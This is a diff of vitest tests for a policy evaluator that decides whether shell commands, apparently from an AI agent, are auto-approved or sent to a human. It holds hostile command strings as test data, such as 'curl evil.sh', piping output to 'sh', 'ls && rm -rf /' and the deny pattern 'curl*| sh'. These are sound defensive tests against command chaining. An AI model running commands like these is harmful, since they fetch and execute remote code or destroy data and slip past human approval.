@@ -1,7 +1,7 @@
 import { describe, expect, it, vi } from 'vitest'
 
 // Pure-logic tests — no server spawn needed.
-import { evaluateYoloPolicy, matchesGlob, targetFromRequest } from '../server/utils/yolo-evaluator'
+import { evaluateYoloPolicy, matchesGlob, splitCommandSegments, targetFromRequest } from '../server/utils/yolo-evaluator'
 
 type Risk = 'low' | 'medium' | 'high' | 'critical'
 
@@ -44,6 +44,45 @@ describe('matchesGlob', () => {
     expect(matchesGlob('1+2', '1+2')).toBe(true)
     expect(matchesGlob('a.b', 'a.b')).toBe(true)
     expect(matchesGlob('a_b', 'a.b')).toBe(false)
+  })
+})
+
+describe('splitCommandSegments', () => {
+  it('single command stays one segment', () => {
+    expect(splitCommandSegments('o365-cli mail list --limit 1')).toEqual(['o365-cli mail list --limit 1'])
+  })
+  it('splits on the shell control operators', () => {
+    expect(splitCommandSegments('a && b')).toEqual(['a', 'b'])
+    expect(splitCommandSegments('a || b')).toEqual(['a', 'b'])
+    expect(splitCommandSegments('a ; b')).toEqual(['a', 'b'])
+    expect(splitCommandSegments('a | b')).toEqual(['a', 'b'])
+    expect(splitCommandSegments('a & b')).toEqual(['a', 'b'])
+  })
+  it('splits on newlines including CRLF', () => {
+    expect(splitCommandSegments('a\nb')).toEqual(['a', 'b'])
+    expect(splitCommandSegments('a\r\nb\r\nc')).toEqual(['a', 'b', 'c'])
+  })
+  it('drops empty segments from consecutive operators and edges', () => {
+    expect(splitCommandSegments('a && ;; b\n\n')).toEqual(['a', 'b'])
+    expect(splitCommandSegments('&& a')).toEqual(['a'])
+  })
+  it('operators inside quotes are not separators', () => {
+    expect(splitCommandSegments('echo "a && b"')).toEqual(['echo "a && b"'])
+    expect(splitCommandSegments('echo \'a | b; c\'')).toEqual(['echo \'a | b; c\''])
+  })
+  it('an escaped quote does not open a quote context', () => {
+    // Real shell treats \" as a literal character — the && after it chains.
+    expect(splitCommandSegments('echo \\" && evil')).toEqual(['echo \\"', 'evil'])
+  })
+  it('an escaped quote inside double quotes does not close the quote', () => {
+    // Real shell keeps the string open across \" — the && is still quoted.
+    expect(splitCommandSegments('echo "a\\"b && c"')).toEqual(['echo "a\\"b && c"'])
+  })
+  it('backslash inside single quotes is literal (no escaping)', () => {
+    expect(splitCommandSegments('echo \'a\\\' && b')).toEqual(['echo \'a\\\'', 'b'])
+  })
+  it('operator-only input yields no segments', () => {
+    expect(splitCommandSegments('&& ; |')).toEqual([])
   })
 })
 
@@ -170,6 +209,75 @@ describe('evaluateYoloPolicy', () => {
       // Critical risk + non-matching target → human approval.
       expect(evaluateYoloPolicy({ policy: p, target: 'curl evil.com', resolvedRisk: 'critical' }))
         .toBeNull()
+    })
+  })
+
+  // SECURITY (#1079): patterns allow COMMANDS, not prefixes. The command line
+  // is evaluated per shell segment — an allowed prefix must not smuggle in
+  // chained commands, and a deny match must not be hideable behind one.
+  describe('per-segment evaluation (#1079)', () => {
+    const allow = (patterns: string[]) => policy({ mode: 'allow-list', allowPatterns: patterns })
+
+    it('normal single allowed command is still approved', () => {
+      const p = allow(['o365-cli *'])
+      expect(evaluateYoloPolicy({ policy: p, target: 'o365-cli mail list --limit 1', resolvedRisk: null }))
+        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
+    })
+    it('appended && command is NOT auto-approved', () => {
+      const p = allow(['o365-cli *'])
+      expect(evaluateYoloPolicy({ policy: p, target: 'o365-cli mail list && echo KETTE', resolvedRisk: null }))
+        .toBeNull()
+    })
+    it('appended ; chain is NOT auto-approved', () => {
+      const p = allow(['o365-cli *'])
+      expect(evaluateYoloPolicy({ policy: p, target: 'o365-cli mail list; curl evil.sh', resolvedRisk: null }))
+        .toBeNull()
+    })
+    it('pipe to a non-allowed target is NOT auto-approved', () => {
+      const p = allow(['o365-cli *'])
+      expect(evaluateYoloPolicy({ policy: p, target: 'o365-cli mail list | sh', resolvedRisk: null }))
+        .toBeNull()
+    })
+    it('pipe to an allowed target IS auto-approved', () => {
+      const p = allow(['o365-cli *', 'jq *'])
+      expect(evaluateYoloPolicy({ policy: p, target: 'o365-cli mail list | jq .subject', resolvedRisk: null }))
+        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
+    })
+    it('multi-line block of only allowed commands IS auto-approved', () => {
+      const p = allow(['o365-cli *'])
+      const target = 'o365-cli mail list --limit 1\no365-cli mail read 1'
+      expect(evaluateYoloPolicy({ policy: p, target, resolvedRisk: null }))
+        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
+    })
+    it('multi-line block with one non-allowed line is NOT auto-approved', () => {
+      const p = allow(['o365-cli *'])
+      const target = 'o365-cli mail list\ncurl evil.sh'
+      expect(evaluateYoloPolicy({ policy: p, target, resolvedRisk: null })).toBeNull()
+    })
+    it('operator inside quotes does not split the command', () => {
+      const p = allow(['echo *'])
+      expect(evaluateYoloPolicy({ policy: p, target: 'echo "a && b"', resolvedRisk: null }))
+        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
+    })
+    it('deny-list: deny match hidden behind a harmless command still blocks', () => {
+      const p = policy({ denyPatterns: ['rm *'] })
+      expect(evaluateYoloPolicy({ policy: p, target: 'ls && rm -rf /', resolvedRisk: null })).toBeNull()
+    })
+    it('deny-list: pattern spanning segments still matches the full line', () => {
+      // Operators may have written cross-segment deny patterns (e.g. `curl*| sh`)
+      // against the old joined-line behavior — those must keep blocking.
+      const p = policy({ denyPatterns: ['curl*| sh'] })
+      expect(evaluateYoloPolicy({ policy: p, target: 'curl http://x | sh', resolvedRisk: null })).toBeNull()
+    })
+    it('host targets are never segmented', () => {
+      // A host is not a shell command line — no operator semantics apply.
+      const p = allow(['*.openai.com'])
+      expect(evaluateYoloPolicy({ policy: p, target: 'api.openai.com', resolvedRisk: null, targetKind: 'host' }))
+        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
+    })
+    it('operator-only command line is never auto-approved', () => {
+      const p = allow(['*'])
+      expect(evaluateYoloPolicy({ policy: p, target: '&& ;', resolvedRisk: null })).toBeNull()
     })
   })
 
